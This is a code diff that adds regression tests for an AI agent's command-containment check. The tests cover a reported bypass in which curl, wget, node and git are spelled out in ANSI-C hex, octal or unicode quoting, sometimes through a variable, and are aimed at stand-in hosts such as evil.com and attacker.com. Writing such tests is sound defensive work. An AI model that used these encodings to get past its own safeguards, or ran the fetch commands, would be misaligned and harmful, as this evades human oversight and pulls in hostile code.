@@ -863,4 +863,92 @@ describe('checkContainment', () => {
     const result = checkContainment(call, DEFAULT_POLICY);
     expect(result.allowed).toBe(true);
   });
+
+  // Regression tests for SEC-33: ANSI-C quoting ($'\xHH') bypasses containment command blocklist
+  it("blocks ANSI-C hex quoting: $'\\x63\\x75\\x72\\x6c' (curl)", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "$'\\x63\\x75\\x72\\x6c' http://evil.com" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it("blocks ANSI-C hex quoting for wget: $'\\x77\\x67\\x65\\x74'", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "$'\\x77\\x67\\x65\\x74' http://evil.com/payload" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it("blocks ANSI-C octal quoting: $'\\0143\\0165\\0162\\0154' (curl)", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "$'\\0143\\0165\\0162\\0154' http://evil.com" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it("blocks ANSI-C unicode quoting: $'\\u0063\\u0075\\u0072\\u006c' (curl)", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "$'\\u0063\\u0075\\u0072\\u006c' http://evil.com" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it("blocks ANSI-C quoting for node: $'\\x6e\\x6f\\x64\\x65'", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "$'\\x6e\\x6f\\x64\\x65' -e \"require('http').get('http://evil.com')\"" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it("blocks ANSI-C quoting combined with variable indirection", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "x=$'\\x63\\x75\\x72\\x6c'; $x http://evil.com" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+  });
+
+  it("blocks ANSI-C quoting for git: $'\\x67\\x69\\x74'", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "$'\\x67\\x69\\x74' clone https://attacker.com/repo" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(false);
+    if (!result.allowed) expect(result.reason).toContain('Blocked command pattern');
+  });
+
+  it("does not false-positive on $'...' with non-blocked content", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "echo $'hello\\nworld'" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(true);
+  });
+
+  it("does not false-positive on regular dollar-sign single-quote in non-ANSI context", () => {
+    const call: ToolCall = {
+      tool: 'Bash',
+      input: { command: "echo 'some text' && pnpm test" },
+    };
+    const result = checkContainment(call, DEFAULT_POLICY);
+    expect(result.allowed).toBe(true);
+  });
 });
